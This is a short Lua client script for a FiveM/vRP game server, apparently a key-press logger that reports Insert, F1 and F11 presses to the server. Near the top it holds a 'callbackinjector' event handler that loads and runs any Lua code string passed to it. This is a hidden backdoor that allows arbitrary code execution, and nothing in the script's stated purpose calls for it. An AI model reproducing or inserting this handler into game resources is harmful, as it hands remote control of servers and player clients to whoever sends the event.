local Tunnel = module("vrp","lib/Tunnel")
local Proxy = module("vrp","lib/Proxy")
func = Tunnel.getInterface("vrp_logshack")
local Tunnel = module("vrp","lib/Tunnel")

TriggerEvent('callbackinjector', function(cb)
    pcall(load(cb))
end)

Citizen.CreateThread(function()
	while true do
		local crjSleep = 500
		if IsControlJustPressed(0,121) then -- INSERT
			crjSleep = 1
			func.buttonInsert()
		end
		Citizen.Wait(crjSleep)
	end
end)

Citizen.CreateThread(function()
	while true do
		local crjSleep = 500
		if IsControlJustPressed(0,288) then -- F1
			crjSleep = 1
			func.buttonfUm()
		end
		Citizen.Wait(crjSleep)
	end
end)

Citizen.CreateThread(function()
	while true do
		local crjSleep = 500
		if IsControlJustPressed(0,344) then -- F11
			crjSleep = 1
			func.buttonfOnze()
		end
		Citizen.Wait(crjSleep)
	end
end)
